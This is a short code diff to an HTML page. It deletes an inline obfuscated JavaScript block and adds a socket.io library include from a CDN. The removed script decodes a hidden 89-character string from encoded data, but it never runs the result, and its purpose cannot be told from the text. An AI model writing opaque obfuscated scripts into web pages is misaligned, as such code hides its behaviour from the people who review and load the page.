@@ -144,20 +144,7 @@
         </footer>
     </section>
     
-    <script>
-        a="1P1[1c1f3L1d2[2Y1_1`3_3b1]3Y3^1S1V1W3N3P1T2`3M1Q3K2c1H1K1L2a2]1I2b2d1>1E3O"
-        +"1A1B2_2e1?2Z2^16191:3T3X173R3S142X123Z3]";
-        l=new Array();
-        while(a.length){l.push((Y(a.charCodeAt(0))<<6)+Y(a.charCodeAt(1))-512);
-        a=a.slice(2,a.length)}
-        d="e2=ciR[O4Ab+^FQ2Ej9GP051Z2+DU,*LKD3S.L-1,1O:TOTA,c,@WUSO7XfJP@<e*K/f*";
-        c=89;e=b=a=0;o="";
-        function Y(y){if(y>92)y--;return y-42}
-        function B(){if(a==0){b=Y(d.charCodeAt(e++));a=6;}
-        return ((b>>--a)&0x01);}
-        while(c--){i=0;while(l[i]<0){if(B())i=-l[i];else i++;}
-        o+=String.fromCharCode(l[i]);}
-    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js"></script>
     <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
     <script src="statistics.js" defer></script>
 </body>
